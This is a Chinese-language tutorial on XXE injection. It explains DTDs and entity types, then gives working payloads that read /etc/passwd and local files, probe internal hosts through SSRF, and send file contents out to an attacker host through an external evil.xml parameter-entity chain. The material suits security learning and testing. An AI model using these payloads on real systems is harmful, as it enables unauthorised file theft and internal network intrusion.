## **0x01:知识准备**

```
XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，
没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。
xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。
由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。
```

### DTD

文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。  
内部声明DTD:

```
<!DOCTYPE 根元素 [元素声明]>
```

引用外部DTD:

```
<!DOCTYPE 根元素 SYSTEM "文件名">
```

DTD文档中有很多重要的关键字如下：

* DOCTYPE（DTD的声明）
* ENTITY（实体的声明）
* SYSTEM、PUBLIC（外部资源申请）

### 实体

实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。  
实体按类型主要分为以下四种：

* 内置实体 \(Built-in entities\)
* 字符实体 \(Character entities\)
* 通用实体 \(General entities\)
* 参数实体 \(Parameter entities\)

实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。  
完整的实体类别可参考[DTD - Entities](https://www.tutorialspoint.com/dtd/dtd_entities.htm)

#### 实体类别介绍

参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&实体名称。  
参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。

**内部实体：**

```
<!ENTITY 实体名称 "实体的值">
```

**外部实体:**

```
<!ENTITY 实体名称 SYSTEM "URI">
```

**参数实体：**

```
<!ENTITY % 实体名称 "实体的值">
或者
<!ENTITY % 实体名称 SYSTEM "URI">
```

实例演示：除参数实体外实体+内部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY name "nMask">]>
<foo>
        <value>&name;</value> 
</foo>
```

实例演示：参数实体+外部实体

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY % name SYSTEM "file:///etc/passwd">
    %name;
]>
```

注意：%name（参数实体）是在DTD中被引用的，而&name（其余实体）是在xml文档中被引用的。

由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。

#### 外部实体

外部实体即在DTD中使用

```
<!ENTITY 实体名称 SYSTEM "URI">
```

语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？

主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：

![](/assets/xxe1.png)

实例演示：

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE a [
    <!ENTITY content SYSTEM "file:///etc/passwd">]>
<foo>
        <value>&content;</value> 
</foo>
```

## 漏洞检测

XML实体分为四种：字符实体，命名实体，外部实体，参数实体

**1、命名实体写法：**

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "file:///c://test/1.txt" >]>        
<value>&xxe;</value>

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://otherhost/xxxx.php" >]>        
<value>&xxe;</value>
```

可以用做xxe+ssrf，用于内网扫描  
**2、命名实体+外部实体写法：**

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE root [
<!ENTITY dtd SYSTEM "http://localhost:88/evil.xml">
]> 
<value>&dtd;</value>
```

这种命名实体调用外部实体，发现evil.xml中不能定义实体，否则解析不了，感觉命名实体好鸡肋，参数实体就好用很多  
**3、第一种命名实体+外部实体+参数实体写法：**

```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///c://test/1.txt">
<!ENTITY % dtd SYSTEM "http://localhost:88/evil.xml"> 
%dtd; %all; 
]> 
<value>&send;</value>
```

其中evil.xml文件内容为

```
<!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:88%file;'>">
```

调用过程为：参数实体dtd调用外部实体evil.xml，然后又调用参数实体all，接着调用命名实体send

**第二种命名实体+外部实体+参数实体写法：**

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/test/1.txt">
<!ENTITY % dtd SYSTEM "http://localhost:88/evil.xml">
%dtd;
%send;
]>
<root></root>
```

其中evil.xml文件内容为：

```
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://localhost:88/?content=%file;'>"> %payload;
```

调用过程和第一种方法类似





参考：

浅谈XXE漏洞攻击与防御 [https://thief.one/2017/06/20/1/](https://thief.one/2017/06/20/1/)

XXE漏洞以及Blind XXE总结 [https://blog.csdn.net/u011721501/article/details/43775691](https://blog.csdn.net/u011721501/article/details/43775691)

[未知攻焉知防——XXE漏洞攻防](https://security.tencent.com/index.php/blog/msg/69)

[XXE漏洞攻防之我见](https://www.anquanke.com/post/id/86075)

[神奇的Content-Type——在JSON中玩转XXE攻击](http://bobao.360.cn/learning/detail/360.html)



